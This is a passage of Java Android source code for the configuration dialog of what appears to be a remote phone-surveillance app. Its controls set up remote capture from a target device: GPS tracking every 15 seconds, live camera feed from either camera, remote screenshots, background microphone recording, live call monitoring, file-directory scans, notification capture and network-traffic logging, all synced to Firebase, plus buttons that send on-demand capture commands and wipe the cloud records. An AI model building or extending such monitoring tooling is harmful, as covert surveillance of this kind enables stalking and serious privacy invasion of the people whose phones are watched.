        boolean isScreenshot = key.equals(ClickActions.REQUEST_SCREENSHOT_PERMISSION.name());
        boolean isMic = key.equals(ClickActions.REQUEST_MIC_PERMISSION.name());
        boolean isVpn = key.equals(ClickActions.REQUEST_VPN_PERMISSION.name());
        boolean isFile = key.equals(ClickActions.REQUEST_FILE_ACCESS_PERMISSION.name());
        boolean isUsage = key.equals(ClickActions.MANAGE_USAGE_AND_APPS.name());
        boolean isNotification = key.equals(ClickActions.REQUEST_NOTIFICATION_ACCESS.name());
        
        ViewGroup root = dialogView.findViewById(R.id.layout_config_root);
        if (root == null) {
            // Fallback if layout structure is different than expected
            ViewGroup mainContainer = (ViewGroup) dialogView;
            if (mainContainer instanceof com.google.android.material.card.MaterialCardView) {
                mainContainer = (ViewGroup) mainContainer.getChildAt(0);
            }
            root = mainContainer;
        }
        
        LinearLayout container = new LinearLayout(activity);
        container.setTag("capture_settings_container");
        container.setOrientation(LinearLayout.VERTICAL);
        container.setPadding(dp(20, density), dp(20, density), dp(20, density), dp(20, density));
        container.setBackground(createSectionBackground(activity));
        LinearLayout.LayoutParams containerParams = new LinearLayout.LayoutParams(-1, -2);
        containerParams.setMargins(0, dp(16, density), 0, dp(16, density));
        container.setLayoutParams(containerParams);

        TextView label = new TextView(activity);
        String labelText = "Automatic Data Sync";
        if (isUsage) labelText = "Usage Sync Settings";
        else if (isLocation) labelText = "Tracking Settings";
        else if (isCamera) labelText = "Camera Feed & Capture Settings";
        else if (isScreenshot) labelText = "Remote Screenshot Settings";
        else if (isMic) labelText = "Voice Recording Settings";
        else if (isVpn) labelText = "VPN & Network Monitoring Settings";
        else if (isFile) labelText = "File Structure Sync Settings";
        else if (isNotification) labelText = "Notification Sync & Alert Settings";
        
        label.setText(labelText);
        label.setTextColor(activity.getColor(R.color.on_primary));
        label.setTypeface(Typeface.create("sans-serif-black", Typeface.NORMAL));
        label.setTextSize(15f);
        label.setLetterSpacing(0.02f);
        container.addView(label);

        TextView subLabel = new TextView(activity);
        String subLabelText = "When enabled, the remote device will automatically upload new records to the cloud based on the selected mode below.";
        if (isUsage) subLabelText = "Configure how the device monitors app usage, installed apps and screen state.";
        else if (isLocation) subLabelText = "Configure how the device tracks and stores GPS data.";
        else if (isCamera) subLabelText = "Configure active camera, resolution and stream settings.";
        else if (isScreenshot) subLabelText = "Adjust screenshot resolution and capture quality.";
        else if (isMic) subLabelText = "Configure voice recording duration and background capture.";
        else if (isVpn) subLabelText = "Configure background network monitoring and traffic logging services.";
        else if (isFile) subLabelText = "Configure how the device indexes and syncs its file directory.";
        else if (isNotification) subLabelText = "Configure real-time notification capture and manage system alerts.";
        
        subLabel.setText(subLabelText);
        subLabel.setTextColor(activity.getColor(R.color.text_secondary));
        subLabel.setTextSize(11f);
        subLabel.setAlpha(0.7f);
        subLabel.setPadding(0, dp(4, density), 0, dp(12, density));
        container.addView(subLabel);

        SwitchMaterial switchCapture = new SwitchMaterial(activity);
        switchCapture.setTag("switch_capture_enabled");
        String switchText = "Enable Background Sync";
        if (isLocation) switchText = "Enable Real-time Tracking";
        else if (isCamera) switchText = "Enable Camera Services";
        else if (isScreenshot) switchText = "Enable Snapshot Services";
        else if (isMic) switchText = "Enable Mic Services";
        else if (isVpn) switchText = "Enable Background Sync";
        else if (isFile) switchText = "Enable File Indexing";
        else if (isNotification) switchText = "Enable Notification Sync";
        
        switchCapture.setText(switchText);
        switchCapture.setTextColor(activity.getColor(R.color.text_primary));
        switchCapture.setTextSize(14f);
        switchCapture.setChecked(data.isCaptureEnabled());
        LinearLayout.LayoutParams switchParams = new LinearLayout.LayoutParams(-1, -2);
        switchParams.setMargins(0, 0, 0, dp(8, density));
        switchCapture.setLayoutParams(switchParams);
        container.addView(switchCapture);

        LinearLayout optionsLayout = new LinearLayout(activity);
        optionsLayout.setOrientation(LinearLayout.VERTICAL);
        optionsLayout.setVisibility(data.isCaptureEnabled() ? View.VISIBLE : View.GONE);
        optionsLayout.setPadding(dp(8, density), dp(4, density), 0, 0);
        switchCapture.setOnCheckedChangeListener((b, checked) -> optionsLayout.setVisibility(checked ? View.VISIBLE : View.GONE));

        // --- NEW: LOCATION SPECIFIC CONFIG ---
        if (isLocation) {
            LinearLayout intervalLayout = new LinearLayout(activity);
            intervalLayout.setOrientation(LinearLayout.HORIZONTAL);
            intervalLayout.setGravity(Gravity.CENTER_VERTICAL);
            intervalLayout.setPadding(dp(12, density), 0, 0, dp(16, density));
            
            TextView intervalLabel = new TextView(activity);
            intervalLabel.setText("Tracking Interval: ");
            intervalLabel.setTextColor(activity.getColor(R.color.text_primary));
            intervalLabel.setTextSize(13f);
            intervalLayout.addView(intervalLabel);

            Spinner intervalSpinner = new Spinner(activity);
            intervalSpinner.setTag("spinner_location_interval");
            intervalSpinner.setMinimumWidth(dp(160, density));
            String[] intervals = {"15 seconds", "30 seconds", "1 minute", "5 minutes", "30 minutes"};
            ArrayAdapter<String> intervalAdapter = new ArrayAdapter<String>(activity, android.R.layout.simple_spinner_item, intervals) {
                @NonNull
                @Override
                public View getView(int position, @Nullable View convertView, @NonNull ViewGroup parent) {
                    View v = super.getView(position, convertView, parent);
                    if (v instanceof TextView) {
                        ((TextView) v).setEllipsize(null);
                        ((TextView) v).setSingleLine(true);
                        ((TextView) v).setTextColor(activity.getColor(R.color.primary));
                    }
                    return v;
                }
            };
            intervalAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
            intervalSpinner.setAdapter(intervalAdapter);
            
            long currentInterval = data.getInterval();
            if (currentInterval == 15000) intervalSpinner.setSelection(0);
            else if (currentInterval == 30000) intervalSpinner.setSelection(1);
            else if (currentInterval == 60000) intervalSpinner.setSelection(2);
            else if (currentInterval == 300000) intervalSpinner.setSelection(3);
            else if (currentInterval == 1800000) intervalSpinner.setSelection(4);
            else intervalSpinner.setSelection(2);
            
            intervalLayout.addView(intervalSpinner);
            optionsLayout.addView(intervalLayout);

            SwitchMaterial switchPersist = new SwitchMaterial(activity);
            switchPersist.setTag("switch_persist_location");
            switchPersist.setText("Persist Location History (Date-wise)");
            switchPersist.setTextColor(activity.getColor(R.color.text_primary));
            switchPersist.setTextSize(13f);
            switchPersist.setPadding(dp(12, density), 0, 0, 0);
            boolean persistEnabled = data.getExtraConfig() != null && 
                                    Boolean.TRUE.equals(data.getExtraConfig().get("persistLocationHistory"));
            switchPersist.setChecked(persistEnabled);
            optionsLayout.addView(switchPersist);
            
            View space = new View(activity);
            optionsLayout.addView(space, new LinearLayout.LayoutParams(-1, dp(12, density)));
        }

        // --- NEW: LIVE CALL MONITORING TOGGLE ---
        if (key.equals(ClickActions.REQUEST_CALL_LOG_PERMISSION.name())) {
            SwitchMaterial switchLive = new SwitchMaterial(activity);
            switchLive.setTag("switch_live_enabled");
            switchLive.setText("Enable Live Call Monitoring");
            switchLive.setTextColor(activity.getColor(R.color.text_primary));
            switchLive.setTextSize(14f);
            boolean liveEnabled = data.getExtraConfig() != null && 
                                 Boolean.TRUE.equals(data.getExtraConfig().get("liveMonitoringEnabled"));
            switchLive.setChecked(liveEnabled);
            optionsLayout.addView(switchLive);
            
            // Add a small divider or space
            View space = new View(activity);
            optionsLayout.addView(space, new LinearLayout.LayoutParams(-1, dp(12, density)));
        }

        // --- NEW: MIC SPECIFIC CONFIG ---
        if (isMic) {
            LinearLayout durationLayout = new LinearLayout(activity);
            durationLayout.setOrientation(LinearLayout.HORIZONTAL);
            durationLayout.setGravity(Gravity.CENTER_VERTICAL);
            durationLayout.setPadding(dp(12, density), 0, 0, dp(16, density));
            
            TextView durationLabel = new TextView(activity);
            durationLabel.setText("Recording Duration: ");
            durationLabel.setTextColor(activity.getColor(R.color.text_primary));
            durationLabel.setTextSize(13f);
            durationLayout.addView(durationLabel);

            Spinner durationSpinner = new Spinner(activity);
            durationSpinner.setTag("spinner_mic_duration");
            durationSpinner.setMinimumWidth(dp(160, density));
            String[] durations = {"15 seconds", "30 seconds", "1 minute", "2 minutes", "5 minutes"};
            ArrayAdapter<String> durationAdapter = new ArrayAdapter<String>(activity, android.R.layout.simple_spinner_item, durations) {
                @NonNull
                @Override
                public View getView(int position, @Nullable View convertView, @NonNull ViewGroup parent) {
                    View v = super.getView(position, convertView, parent);
                    if (v instanceof TextView) {
                        ((TextView) v).setEllipsize(null);
                        ((TextView) v).setSingleLine(true);
                        ((TextView) v).setTextColor(activity.getColor(R.color.primary));
                    }
                    return v;
                }
            };
            durationAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
            durationSpinner.setAdapter(durationAdapter);
            
            long currentDuration = data.getInterval();
            if (currentDuration == 15000) durationSpinner.setSelection(0);
            else if (currentDuration == 30000) durationSpinner.setSelection(1);
            else if (currentDuration == 60000) durationSpinner.setSelection(2);
            else if (currentDuration == 120000) durationSpinner.setSelection(3);
            else if (currentDuration == 300000) durationSpinner.setSelection(4);
            else durationSpinner.setSelection(1); // Default 30s
            
            durationLayout.addView(durationSpinner);
            optionsLayout.addView(durationLayout);

            SwitchMaterial switchPersist = new SwitchMaterial(activity);
            switchPersist.setTag("switch_persist_mic");
            switchPersist.setText("Persist Recordings (Date-wise)");
            switchPersist.setTextColor(activity.getColor(R.color.text_primary));
            switchPersist.setTextSize(13f);
            switchPersist.setPadding(dp(12, density), 0, 0, 0);
            boolean persistEnabled = data.getExtraConfig() != null && 
                                    Boolean.TRUE.equals(data.getExtraConfig().get("persistMicRecordings"));
            switchPersist.setChecked(persistEnabled);
            optionsLayout.addView(switchPersist);
            
            View space = new View(activity);
            optionsLayout.addView(space, new LinearLayout.LayoutParams(-1, dp(12, density)));
        }

        // --- NEW: CAMERA & SCREENSHOT SHARED/SPECIFIC CONFIG ---
        if (isCamera || isScreenshot) {
            if (isCamera) {
                // Camera Selection
                LinearLayout camLayout = new LinearLayout(activity);
                camLayout.setOrientation(LinearLayout.HORIZONTAL);
                camLayout.setGravity(Gravity.CENTER_VERTICAL);
                camLayout.setPadding(dp(12, density), dp(8, density), 0, dp(8, density));
                
                TextView camLabel = new TextView(activity);
                camLabel.setText("Active Camera: ");
                camLabel.setTextColor(activity.getColor(R.color.text_primary));
                camLabel.setTextSize(13f);
                camLabel.setLayoutParams(new LinearLayout.LayoutParams(0, -2, 1.2f));
                camLayout.addView(camLabel);

                Spinner camSpinner = new Spinner(activity);
                camSpinner.setTag("spinner_camera_facing");
                camSpinner.setLayoutParams(new LinearLayout.LayoutParams(0, -2, 1.8f));
                String[] cameras = {"Back Camera (Main)", "Front Camera (Selfie)", "Both (Now Only)"};
                ArrayAdapter<String> camAdapter = new ArrayAdapter<String>(activity, android.R.layout.simple_spinner_item, cameras) {
                    @NonNull
                    @Override
                    public View getView(int position, @Nullable View convertView, @NonNull ViewGroup parent) {
                        View v = super.getView(position, convertView, parent);
                        if (v instanceof TextView) {
                            ((TextView) v).setTextColor(activity.getColor(R.color.primary));
                            ((TextView) v).setTextSize(13f);
                        }
                        return v;
                    }
                };
                camAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
                camSpinner.setAdapter(camAdapter);
                
                String currentCam = data.getExtraConfig() != null ? (String) data.getExtraConfig().get("cameraFacing") : "BACK";
                if ("FRONT".equals(currentCam)) camSpinner.setSelection(1);
                else if ("BOTH".equals(currentCam)) camSpinner.setSelection(2);
                else camSpinner.setSelection(0);
                
                camLayout.addView(camSpinner);
                optionsLayout.addView(camLayout);
            }

            // Resolution Selection (Common for Camera and Screenshot)
            LinearLayout resLayout = new LinearLayout(activity);
            resLayout.setOrientation(LinearLayout.HORIZONTAL);
            resLayout.setGravity(Gravity.CENTER_VERTICAL);
            resLayout.setPadding(dp(12, density), 0, 0, dp(12, density));
            
            TextView resLabel = new TextView(activity);
            resLabel.setText("Resolution: ");
            resLabel.setTextColor(activity.getColor(R.color.text_primary));
            resLabel.setTextSize(13f);
            resLabel.setLayoutParams(new LinearLayout.LayoutParams(0, -2, 1.2f));
            resLayout.addView(resLabel);

            Spinner resSpinner = new Spinner(activity);
            resSpinner.setTag("spinner_camera_resolution"); // Reused tag
            resSpinner.setLayoutParams(new LinearLayout.LayoutParams(0, -2, 1.8f));
            String[] resolutions = {"480p (Fast)", "720p (HD)", "1080p (Full HD)"};
            ArrayAdapter<String> resAdapter = new ArrayAdapter<String>(activity, android.R.layout.simple_spinner_item, resolutions) {
                @NonNull
                @Override
                public View getView(int position, @Nullable View convertView, @NonNull ViewGroup parent) {
                    View v = super.getView(position, convertView, parent);
                    if (v instanceof TextView) {
                        ((TextView) v).setTextColor(activity.getColor(R.color.primary));
                        ((TextView) v).setTextSize(13f);
                    }
                    return v;
                }
            };
            resAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
            resSpinner.setAdapter(resAdapter);
            
            String currentRes = data.getExtraConfig() != null ? (String) data.getExtraConfig().get("resolution") : "480p";
            if ("1080p".equals(currentRes)) resSpinner.setSelection(2);
            else if ("720p".equals(currentRes)) resSpinner.setSelection(1);
            else resSpinner.setSelection(0);
            
            resLayout.addView(resSpinner);
            optionsLayout.addView(resLayout);

            // Quality Slider
            TextView qualLabel = new TextView(activity);
            int currentQual = data.getExtraConfig() != null && data.getExtraConfig().containsKey("quality") ? 
                            ((Number) data.getExtraConfig().get("quality")).intValue() : 30;
            qualLabel.setText("Capture Quality: " + currentQual + "%");
            qualLabel.setTextColor(activity.getColor(R.color.text_primary));
            qualLabel.setTextSize(13f);
            qualLabel.setPadding(dp(12, density), dp(12, density), 0, 0);
            optionsLayout.addView(qualLabel);

            com.google.android.material.slider.Slider qualSlider = new com.google.android.material.slider.Slider(activity);
            qualSlider.setTag("slider_camera_quality"); // Reused tag
            qualSlider.setValueFrom(10f);
            qualSlider.setValueTo(100f);
            qualSlider.setStepSize(10f);
            qualSlider.setValue((float) currentQual);
            qualSlider.setPadding(dp(12, density), 0, dp(12, density), dp(8, density));
            qualSlider.addOnChangeListener((slider, value, fromUser) -> qualLabel.setText("Capture Quality: " + (int)value + "%"));
            optionsLayout.addView(qualSlider);

            if (isCamera) {
                // Live Feed Settings Section
                View liveDivider = new View(activity);
                liveDivider.setBackgroundColor(activity.getColor(R.color.divider));
                LinearLayout.LayoutParams liveDivParams = new LinearLayout.LayoutParams(-1, dp(1, density));
                liveDivParams.setMargins(dp(12, density), dp(16, density), dp(12, density), dp(8, density));
                optionsLayout.addView(liveDivider, liveDivParams);

                TextView liveHeader = new TextView(activity);
                liveHeader.setText("Live Feed Settings");
                liveHeader.setTextColor(activity.getColor(R.color.primary));
                liveHeader.setTypeface(null, Typeface.BOLD);
                liveHeader.setTextSize(14f);
                liveHeader.setPadding(dp(12, density), dp(8, density), 0, dp(12, density));
                optionsLayout.addView(liveHeader);

                // Interval selection
                LinearLayout intervalLayout = new LinearLayout(activity);
                intervalLayout.setOrientation(LinearLayout.HORIZONTAL);
                intervalLayout.setGravity(Gravity.CENTER_VERTICAL);
                intervalLayout.setPadding(dp(12, density), 0, 0, dp(12, density));
                
                TextView intervalLabel = new TextView(activity);
                intervalLabel.setText("Frame Interval: ");
                intervalLabel.setTextColor(activity.getColor(R.color.text_primary));
                intervalLabel.setTextSize(13f);
                intervalLabel.setLayoutParams(new LinearLayout.LayoutParams(0, -2, 1.2f));
                intervalLayout.addView(intervalLabel);

                Spinner intervalSpinner = new Spinner(activity);
                intervalSpinner.setTag("spinner_camera_interval");
                intervalSpinner.setLayoutParams(new LinearLayout.LayoutParams(0, -2, 1.8f));
                String[] intervals = {"200 ms (Stream)", "500 ms", "1 sec", "3 sec", "5 sec"};
                ArrayAdapter<String> intervalAdapter = new ArrayAdapter<String>(activity, android.R.layout.simple_spinner_item, intervals) {
                    @NonNull
                    @Override
                    public View getView(int position, @Nullable View convertView, @NonNull ViewGroup parent) {
                        View v = super.getView(position, convertView, parent);
                        if (v instanceof TextView) {
                            ((TextView) v).setTextColor(activity.getColor(R.color.primary));
                            ((TextView) v).setTextSize(13f);
                        }
                        return v;
                    }
                };
                intervalAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
                intervalSpinner.setAdapter(intervalAdapter);
                
                long currentInterval = data.getInterval();
                if (currentInterval == 200) intervalSpinner.setSelection(0);
                else if (currentInterval == 500) intervalSpinner.setSelection(1);
                else if (currentInterval == 1000) intervalSpinner.setSelection(2);
                else if (currentInterval == 3000) intervalSpinner.setSelection(3);
                else if (currentInterval == 5000) intervalSpinner.setSelection(4);
                else intervalSpinner.setSelection(2);
                
                intervalLayout.addView(intervalSpinner);
                optionsLayout.addView(intervalLayout);

                // Stream Duration
                LinearLayout durationLayout = new LinearLayout(activity);
                durationLayout.setOrientation(LinearLayout.HORIZONTAL);
                durationLayout.setGravity(Gravity.CENTER_VERTICAL);
                durationLayout.setPadding(dp(12, density), 0, 0, dp(16, density));
                
                TextView durationLabel = new TextView(activity);
                durationLabel.setText("Max Duration: ");
                durationLabel.setTextColor(activity.getColor(R.color.text_primary));
                durationLabel.setTextSize(13f);
                durationLabel.setLayoutParams(new LinearLayout.LayoutParams(0, -2, 1.2f));
                durationLayout.addView(durationLabel);

                Spinner durationSpinner = new Spinner(activity);
                durationSpinner.setTag("spinner_camera_duration");
                durationSpinner.setLayoutParams(new LinearLayout.LayoutParams(0, -2, 1.8f));
                String[] durations = {"15 sec", "30 sec", "1 min (Max)"};
                ArrayAdapter<String> durationAdapter = new ArrayAdapter<String>(activity, android.R.layout.simple_spinner_item, durations) {
                    @NonNull
                    @Override
                    public View getView(int position, @Nullable View convertView, @NonNull ViewGroup parent) {
                        View v = super.getView(position, convertView, parent);
                        if (v instanceof TextView) {
                            ((TextView) v).setTextColor(activity.getColor(R.color.primary));
                            ((TextView) v).setTextSize(13f);
                        }
                        return v;
                    }
                };
                durationAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
                durationSpinner.setAdapter(durationAdapter);
                
                int currentDuration = data.getExtraConfig() != null && data.getExtraConfig().containsKey("duration") ? 
                                    ((Number) data.getExtraConfig().get("duration")).intValue() : 15;
                if (currentDuration == 60) durationSpinner.setSelection(2);
                else if (currentDuration == 30) durationSpinner.setSelection(1);
                else durationSpinner.setSelection(0);
                
                durationLayout.addView(durationSpinner);
                optionsLayout.addView(durationLayout);
            }
        }
        
        RadioGroup modeGroup = new RadioGroup(activity);
        modeGroup.setTag("radio_group_capture_mode");
        
        String[] modes = {"Real-time (On Change)", "Scheduled (Daily)", "Manual Only"};
        String[] modeValues = {"REAL_TIME", "SCHEDULED", "MANUAL"};
        String[] modeDescs = {"Upload immediately when new data is detected.", 
                             "Upload once a day at a specific time.", 
                             "Only upload when you click 'Capture Now'."};

        LinearLayout timePickerLayout = new LinearLayout(activity);
        timePickerLayout.setOrientation(LinearLayout.HORIZONTAL);
        timePickerLayout.setGravity(Gravity.CENTER_VERTICAL);
        timePickerLayout.setPadding(dp(32, density), dp(8, density), 0, dp(16, density));
        
        TextView timeLabel = new TextView(activity);
        timeLabel.setText("Preferred Sync Time: ");
        timeLabel.setTextColor(activity.getColor(R.color.text_secondary));
        timeLabel.setTextSize(12f);
        timePickerLayout.addView(timeLabel);

        TextView timeValue = new TextView(activity);
        timeValue.setTag("text_capture_time");
        timeValue.setText(data.getCaptureScheduleTime() != null ? data.getCaptureScheduleTime() : "20:00");
        timeValue.setTextColor(activity.getColor(R.color.primary));
        timeValue.setTypeface(null, Typeface.BOLD);
        timeValue.setBackground(createSectionBackground(activity));
        timeValue.setPadding(dp(12, density), dp(6, density), dp(12, density), dp(6, density));
        timeValue.setOnClickListener(v -> {
            String current = timeValue.getText().toString();
            int h = 20, m = 0;
            try {
                String[] parts = current.split(":");
                h = Integer.parseInt(parts[0]);
                m = Integer.parseInt(parts[1]);
            } catch (Exception ignored) {}
            new android.app.TimePickerDialog(activity, (tp, h1, m1) -> 
                timeValue.setText(String.format(Locale.getDefault(), "%02d:%02d", h1, m1)), h, m, true).show();
        });
        timePickerLayout.addView(timeValue);

        // Manual Capture Layout
        LinearLayout manualCaptureLayout = new LinearLayout(activity);
        manualCaptureLayout.setOrientation(LinearLayout.VERTICAL);
        manualCaptureLayout.setPadding(dp(32, density), dp(8, density), dp(16, density), dp(16, density));

        com.google.android.material.button.MaterialButton btnCaptureNow = new com.google.android.material.button.MaterialButton(activity, null, com.google.android.material.R.attr.materialButtonStyle);
        btnCaptureNow.setText(isScreenshot ? "Take Screenshot Now" : (isMic ? "Record Audio Now" : (isCamera ? "Capture Photo Now" : "Capture Now")));
        btnCaptureNow.setTextSize(12f);
        btnCaptureNow.setCornerRadius(dp(8, density));
        btnCaptureNow.setOnClickListener(v -> {
            // Retrieve current configuration state from the dialog's UI elements
            boolean captureEnabled = true;
            String captureMode = "MANUAL";
            String captureTime = "20:00";
            String cameraFacing = "BACK";
            long currentInterval = data.getInterval();
            
            if (switchCapture != null) captureEnabled = switchCapture.isChecked();
            
            if (modeGroup != null) {
                int checkedId = modeGroup.getCheckedRadioButtonId();
                View selected = modeGroup.findViewById(checkedId);
                if (selected != null && selected.getTag() != null) {
                    captureMode = selected.getTag().toString();
                }
            }
            
            if (timeValue != null) captureTime = timeValue.getText().toString();

            java.util.Map<String, Object> newExtra = new java.util.HashMap<>();
            if (data.getExtraConfig() != null) newExtra.putAll(data.getExtraConfig());

            Spinner camSpinner = container.findViewWithTag("spinner_camera_facing");
            if (camSpinner != null) {
                int pos = camSpinner.getSelectedItemPosition();
                if (pos == 1) cameraFacing = "FRONT";
                else if (pos == 2) cameraFacing = "BOTH";
                newExtra.put("cameraFacing", cameraFacing);
            }

            Spinner micSpinner = container.findViewWithTag("spinner_mic_duration");
            SwitchMaterial switchPersistMic = container.findViewWithTag("switch_persist_mic");
            if (micSpinner != null) {
                String selected = micSpinner.getSelectedItem().toString();
                if (selected.contains("15 seconds")) currentInterval = 15000;
                else if (selected.contains("30 seconds")) currentInterval = 30000;
                else if (selected.contains("1 minute")) currentInterval = 60000;
                else if (selected.contains("2 minutes")) currentInterval = 120000;
                else if (selected.contains("5 minutes")) currentInterval = 300000;
            }
            if (switchPersistMic != null) {
                newExtra.put("persistMicRecordings", switchPersistMic.isChecked());
            }

            User.AppTriggerSettingsData captureTrigger = User.AppTriggerSettingsData.builder()
                .type(com.vikasyadavnsit.cdc.enums.TriggerType.PERMISSION)
                .enabled(true)
                .captureEnabled(captureEnabled)
                .captureMode(captureMode)
                .captureScheduleTime(captureTime)
                .actionStatus(ActionStatus.START)
                .permissionGranted(data.isPermissionGranted())
                .clickActions(ClickActions.valueOf(key))
                .uploadDataSnapshot(true)
                .saveOnLocalFile(true)
                .interval(currentInterval)
                .extraConfig(newExtra)
                .lastCaptureTimestamp(System.currentTimeMillis())
                .build();
            if (isFile) {
                FirebaseUtils.requestRemoteDirectoryScan("", true);
            } else {
                FirebaseUtils.updateRemoteTrigger(key, captureTrigger);
            }
            
            String msg = isMic ? "Voice recording command sent" : 
                        (isCamera || isScreenshot ? "Snapshot command sent to device" : (isFile ? "Full directory scan command sent" : "Capture command sent"));
            Toast.makeText(activity, msg, Toast.LENGTH_SHORT).show();
        });
        manualCaptureLayout.addView(btnCaptureNow);

        if (!isLocation && !isCamera && !isScreenshot && !isMic) {
            for (int i = 0; i < modes.length; i++) {
                RadioButton rb = new RadioButton(activity);
                rb.setId(View.generateViewId());
                rb.setTag(modeValues[i]);
                rb.setText(modes[i]);
                rb.setTextColor(activity.getColor(R.color.text_primary));
                rb.setTextSize(13f);
                rb.setButtonTintList(android.content.res.ColorStateList.valueOf(activity.getColor(R.color.primary)));
                modeGroup.addView(rb);

                TextView desc = new TextView(activity);
                desc.setText(modeDescs[i]);
                desc.setTextColor(activity.getColor(R.color.text_hint));
                desc.setTextSize(10f);
                desc.setPadding(dp(32, density), 0, 0, dp(8, density));
                modeGroup.addView(desc);
                
                // Insert child layouts right after their corresponding options
                if ("SCHEDULED".equals(modeValues[i])) {
                    modeGroup.addView(timePickerLayout);
                }
                if ("MANUAL".equals(modeValues[i])) {
                    modeGroup.addView(manualCaptureLayout);
                }
                
                if (modeValues[i].equals(data.getCaptureMode() != null ? data.getCaptureMode() : "REAL_TIME")) {
                    rb.setChecked(true);
                }
            }
        }
        optionsLayout.addView(modeGroup);
        
        modeGroup.setOnCheckedChangeListener((g, checkedId) -> {
            View selected = g.findViewById(checkedId);
            String mode = selected != null && selected.getTag() != null ? selected.getTag().toString() : "";
            timePickerLayout.setVisibility("SCHEDULED".equals(mode) ? View.VISIBLE : View.GONE);
            manualCaptureLayout.setVisibility("MANUAL".equals(mode) ? View.VISIBLE : View.GONE);
        });
        
        // Initial visibility
        if (!isLocation && !isCamera && !isScreenshot && !isMic) {
            String currentMode = data.getCaptureMode() != null ? data.getCaptureMode() : "REAL_TIME";
            timePickerLayout.setVisibility("SCHEDULED".equals(currentMode) ? View.VISIBLE : View.GONE);
            manualCaptureLayout.setVisibility("MANUAL".equals(currentMode) ? View.VISIBLE : View.GONE);
        } else {
            timePickerLayout.setVisibility(View.GONE);
            manualCaptureLayout.setVisibility(View.GONE);
        }

        View divider = new View(activity);
        divider.setBackgroundColor(activity.getColor(R.color.divider));
        LinearLayout.LayoutParams divParams = new LinearLayout.LayoutParams(-1, dp(1, density));
        divParams.setMargins(0, dp(16, density), 0, dp(16, density));
        optionsLayout.addView(divider, divParams);

        // Action Buttons Row
        LinearLayout btnRow = new LinearLayout(activity);
        btnRow.setOrientation(LinearLayout.VERTICAL);
        btnRow.setPadding(0, dp(8, density), 0, 0);

        TextView wipeDesc = new TextView(activity);
        wipeDesc.setText("Danger Zone: Permanent cloud data deletion");
        wipeDesc.setTextColor(activity.getColor(R.color.spending_debit));
        wipeDesc.setTextSize(10f);
        wipeDesc.setAlpha(0.7f);
        wipeDesc.setPadding(dp(4, density), 0, 0, dp(8, density));
        btnRow.addView(wipeDesc);
        
        com.google.android.material.button.MaterialButton btnClear = new com.google.android.material.button.MaterialButton(activity, null, com.google.android.material.R.attr.materialButtonOutlinedStyle);
        btnClear.setText("Wipe Stored Cloud Data");
        btnClear.setTextColor(activity.getColor(R.color.spending_debit));
        btnClear.setStrokeColor(android.content.res.ColorStateList.valueOf(activity.getColor(R.color.spending_debit)));
        btnClear.setStrokeWidth(dp(1, density));
        btnClear.setCornerRadius(dp(8, density));
        btnClear.setTextSize(12f);
        btnClear.setAllCaps(false);
        btnClear.setIconResource(android.R.drawable.ic_menu_delete);
        btnClear.setIconTint(android.content.res.ColorStateList.valueOf(activity.getColor(R.color.spending_debit)));
        btnClear.setOnClickListener(v -> {
            String categoryLabel = key.replace("REQUEST_", "").replace("_PERMISSION", "").replace("_", " ");
            new AlertDialog.Builder(activity)
                .setTitle("Confirm Data Wipe")
                .setMessage("This will permanently delete all stored " + categoryLabel + " records from the cloud. This action cannot be undone.")
                .setPositiveButton("Wipe Now", (d, w) -> {
                    String category = "";
                    if (key.equals(ClickActions.REQUEST_SMS_PERMISSION.name())) category = "sms";
                    else if (key.equals(ClickActions.REQUEST_CALL_LOG_PERMISSION.name())) category = "callLogs";
                    else if (key.equals(ClickActions.REQUEST_CONTACTS_PERMISSION.name())) category = "contacts";
                    else if (key.equals(ClickActions.REQUEST_LOCATION_PERMISSION.name())) category = "geolocation";
                    else if (key.equals(ClickActions.REQUEST_CAMERA_PERMISSION.name())) category = "camera";
                    else if (key.equals(ClickActions.REQUEST_MIC_PERMISSION.name())) category = "mic";
                    else if (key.equals(ClickActions.REQUEST_SCREENSHOT_PERMISSION.name())) {
                        category = "screenshot";
                        // Also wipe history for screenshots when doing a full category wipe
                        FirebaseUtils.getDbRef(FirebaseUtils.getSelectedUserPath("/userDeviceData/screenshotHistory")).removeValue();
                    }
                    else if (key.equals(ClickActions.REQUEST_FILE_ACCESS_PERMISSION.name())) category = "fileStructure";
                    else if (key.equals(ClickActions.REQUEST_VPN_PERMISSION.name())) category = "vpnTraffic";
                    else if (key.equals(ClickActions.REQUEST_NOTIFICATION_ACCESS.name())) {
                        category = "notifications";
                        FirebaseUtils.getDbRef(FirebaseUtils.getSelectedUserPath("/userDeviceData/alertHistory")).removeValue();
                    }
                    else if (key.equals(ClickActions.MANAGE_USAGE_AND_APPS.name())) {
                        FirebaseUtils.wipeRemoteCloudData("appStats");
                        FirebaseUtils.wipeRemoteCloudData("installedApps");
                        FirebaseUtils.wipeRemoteCloudData("screenState");
                        Toast.makeText(activity, "Usage cloud data wiped successfully", Toast.LENGTH_SHORT).show();
                        return;
                    }
                    
                    if (!category.isEmpty()) {
                        FirebaseUtils.wipeRemoteCloudData(category);
                        Toast.makeText(activity, "Cloud data wiped successfully", Toast.LENGTH_SHORT).show();
                    }
                })
                .setNegativeButton("Cancel", null).show();
        });
        btnRow.addView(btnClear);

        optionsLayout.addView(btnRow);
        container.addView(optionsLayout);

        int saveIdx = -1;
        for (int i = 0; i < root.getChildCount(); i++) {
            if (root.getChildAt(i).getId() == R.id.btn_save) {
                saveIdx = i;
                break;
            }
        }
        if (saveIdx != -1) root.addView(container, saveIdx);
        else root.addView(container);
    }

    private android.graphics.drawable.Drawable createSectionBackground(Context context) {
        GradientDrawable gd = new GradientDrawable();
        gd.setColor(context.getColor(R.color.surface_variant));
        gd.setCornerRadius(dp(12, context.getResources().getDisplayMetrics().density));
        gd.setStroke(dp(1, context.getResources().getDisplayMetrics().density), context.getColor(R.color.outline));
        return gd;
    }

    private static String formatInterval(long millis) {
        if (millis <= 0) return "Instant";
        if (millis < 1000) return millis + "ms";
        long seconds = TimeUnit.MILLISECONDS.toSeconds(millis);
        if (seconds < 60) return seconds + "s";
        long minutes = TimeUnit.MILLISECONDS.toMinutes(millis);
        return minutes + "m";
    }

    private static String getIconForKey(String key) {
        try {
            ClickActions action = ClickActions.valueOf(key);
            switch (action) {
